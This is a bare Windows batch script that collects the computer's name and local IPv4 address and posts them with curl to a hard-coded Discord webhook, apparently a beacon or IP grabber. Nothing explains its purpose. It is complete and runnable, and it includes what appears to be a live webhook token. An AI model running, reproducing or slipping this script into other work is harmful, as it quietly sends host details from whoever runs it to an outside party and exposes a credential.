@echo off

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
    set IP=%%a
)

set IP=%IP: =%

set WEBHOOK_URL=https://discord.com/api/webhooks/1354302838121037966/sNSEX8a8MLMLhJoEC8Deqk_oSmQuYnKBNLBkKN4cC1Ie4BKuFP1O1NuTH0jlq72BIjPb

set MESSAGE=%COMPUTERNAME%: %IP%

curl -X POST %WEBHOOK_URL% -H "Content-Type: application/json" -d "{\"content\":\"%MESSAGE%\"}"

exit
